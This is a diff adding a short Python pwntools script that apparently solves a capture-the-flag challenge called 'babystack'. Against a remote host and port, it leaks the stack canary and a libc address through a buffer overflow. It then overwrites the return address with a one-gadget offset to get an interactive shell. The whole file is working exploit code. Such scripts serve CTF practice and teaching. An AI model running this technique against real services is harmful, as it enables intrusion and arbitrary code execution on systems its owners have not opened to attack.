@@ -1,0 +1,31 @@
+from pwn import *
+p=process("./babystack")
+p=remote("111.198.29.45","58505")
+# context.log_level='debug'
+p.recvuntil(">>")
+p.sendline("1")
+p.recv(timeout=1)
+p.sendline('1'*0x88)
+p.recvuntil(">>")
+p.sendline("2")
+p.recvuntil('\n')
+canary=u64(p.recv(7)+'\x00')<<8
+info(hex(canary))
+payload='1'*0x98
+p.recvuntil(">>")
+p.sendline("1")
+p.recv(timeout=1)
+p.sendline('1'*0x97)
+p.recvuntil(">>")
+p.sendline("2")
+p.recvuntil('\n')
+libc_base=u64(p.recv(6)+'\x00\x00')-0x20830
+info(hex(libc_base))
+payload='1'*0x88+p64(canary)+p64(0)+p64(libc_base+0xf1147)
+p.recvuntil(">>")
+p.sendline("1")
+p.recv(timeout=1)
+p.sendline(payload)
+p.recv()
+p.sendline('3')
+p.interactive()
